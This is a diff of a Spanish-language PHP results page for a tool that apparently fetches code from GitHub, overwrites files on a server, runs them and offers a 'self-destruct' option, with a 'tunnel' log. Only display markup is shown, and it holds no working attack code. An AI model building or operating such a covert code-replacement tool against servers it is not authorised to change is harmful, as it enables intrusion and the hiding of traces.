+        <?php if ($resultado['ok']): ?>
+            <span class="result-status status-ok">✓ REEMPLAZO EXITOSO</span>
+        <?php else: ?>
+            <span class="result-status status-err">✗ FALLÓ</span>
+        <?php endif; ?>
+        
+        <h2>📊 Resultado del reemplazo</h2>
+        
+        <div class="meta-grid">
+            <div class="meta-item">
+                <div class="ml">IP Servidor</div>
+                <div class="mv"><?= htmlspecialchars($ip_servidor) ?></div>
+            </div>
             <div class="meta-item">
                 <div class="ml">Archivo</div>
                 <div class="mv"><?= htmlspecialchars($resultado['nombre']) ?></div>
             </div>
             <div class="meta-item">
-                <div class="ml">Tamaño</div>
-                <div class="mv"><?= number_format($resultado['tamanio']) ?> bytes</div>
+                <div class="ml">Bytes escritos</div>
+                <div class="mv"><?= number_format($resultado['bytes']) ?></div>
             </div>
             <div class="meta-item">
-                <div class="ml">IP servidor</div>
-                <div class="mv"><?= htmlspecialchars($ip_servidor) ?></div>
+                <div class="ml">Autodestruir</div>
+                <div class="mv"><?= $resultado['autodestruir'] ? 'SÍ 💣' : 'No' ?></div>
             </div>
         </div>
         
-        <div class="r-meta" style="margin-bottom:14px;">
-            <div class="meta-item" style="grid-column:1/-1;">
-                <div class="ml">URL GitHub</div>
-                <div class="mv" style="font-size:0.72rem;"><?= htmlspecialchars($resultado['url']) ?></div>
+        <?php if ($resultado['ok']): ?>
+            <div class="refresh-hint">
+                🔄 <strong>¡LISTO!</strong> Actualiza la página para ver el NUEVO código ejecutándose
+                <?php if ($resultado['autodestruir']): ?>
+                    <br><span style="color:#ef5350;">💣 El archivo se borrará automáticamente</span>
+                <?php endif; ?>
             </div>
+        <?php endif; ?>
+        
+        <?php if (isset($resultado['error'])): ?>
+            <div class="msg error" style="margin-top:14px;">❌ <?= htmlspecialchars($resultado['error']) ?></div>
+        <?php endif; ?>
+    
+    <?php elseif ($resultado['accion'] === 'ver'): ?>
+        
+        <span class="result-status status-ok">📋 VISTA PREVIA</span>
+        <h2>Contenido de: <?= htmlspecialchars($resultado['nombre']) ?> (<?= number_format($resultado['tamanio']) ?> bytes)</h2>
+        <div class="code-view"><?= htmlspecialchars($resultado['contenido']) ?></div>
+    
+    <?php endif; ?>
+    
+    <!-- Log -->
+    <?php if (!empty($log)): ?>
+    <div class="log-box">
+        <strong>📋 Log del túnel:</strong><br><br>
+        <?php foreach ($log as $linea): ?>
+        <div class="log-line <?= strpos($linea,'✅')!==false?'ok':(strpos($linea,'❌')!==false?'err':(strpos($linea,'⚠️')!==false||strpos($linea,'💣')!==false?'warn':'')) ?>">
+            <?= htmlspecialchars($linea) ?>
         </div>
-        
-        <?php if ($resultado['accion'] === 'ver'): ?>
-            <pre><?= htmlspecialchars($resultado['contenido']) ?></pre>
-        <?php endif; ?>
-        
-        <?php if (isset($resultado['ruta_local'])): ?>
-        <div class="r-meta" style="margin-bottom:14px;">
-            <div class="meta-item" style="grid-column:1/-1;">
-                <div class="ml">📁 Ruta en servidor</div>
-                <div class="mv" style="font-size:0.75rem;"><?= htmlspecialchars($resultado['ruta_local']) ?></div>
-            </div>
-            <div class="meta-item" style="grid-column:1/-1;">
-                <div class="ml">🌐 URL pública</div>
-                <div class="mv" style="font-size:0.75rem;"><a href="<?= htmlspecialchars($resultado['url_publica']) ?>" target="_blank" style="color:#c47046;"><?= htmlspecialchars($resultado['url_publica']) ?></a></div>
-            </div>
-        </div>
-        <?php endif; ?>
-        
-        <?php if (isset($resultado['salida'])): ?>
-            <div class="r-title">📤 Salida de ejecución:</div>
-            <div class="output"><?= htmlspecialchars($resultado['salida']) ?></div>
-        <?php endif; ?>
-        
-        <?php if (isset($resultado['url_publica'])): ?>
-        <div class="actions">
-            <button class="btn btn-small btn-sec" onclick="copiar('<?= htmlspecialchars($resultado['url_publica']) ?>', this)">📋 Copiar URL pública</button>
-            <a href="<?= htmlspecialchars($resultado['url_publica']) ?>" target="_blank">🔗 Abrir en nueva pestaña</a>
-        </div>
-        <?php endif; ?>
+        <?php endforeach; ?>
     </div>
+    <?php endif; ?>
 </div>
 <?php endif; ?>
 
-<!-- Archivos guardados -->
-<div class="card">
-    <h2>📂 Archivos guardados en este servidor (<?= count($archivos_guardados) ?>)</h2>
-    <?php if (empty($archivos_guardados)): ?>
-        <div class="empty">No hay archivos guardados aún</div>
-    <?php else: ?>
-        <?php foreach ($archivos_guardados as $f): ?>
-        <div class="file-item">
-            <div>
-                <div class="fi-name">📄 <?= htmlspecialchars($f['nombre']) ?></div>
-                <div class="fi-meta"><?= $f['fecha'] ?> • <?= $f['tamanio'] ?></div>
-            </div>
-            <div class="fi-actions">
-                <button class="btn btn-small btn-sec" onclick="copiar('<?= htmlspecialchars($f['url']) ?>', this)">📋</button>
-                <a href="<?= htmlspecialchars($f['url']) ?>" target="_blank" class="btn btn-small">🔗</a>
-            </div>
-        </div>
-        <?php endforeach; ?>
-    <?php endif; ?>
 </div>
-
-</div>
-
-<script>
-function copiar(texto, btn) {
-    navigator.clipboard.writeText(texto).then(() => {
-        const original = btn.textContent;
-        btn.textContent = '✅';
-        setTimeout(() => btn.textContent = original, 1200);
-    });
-}
-</script>
 
 </body>
 </html>
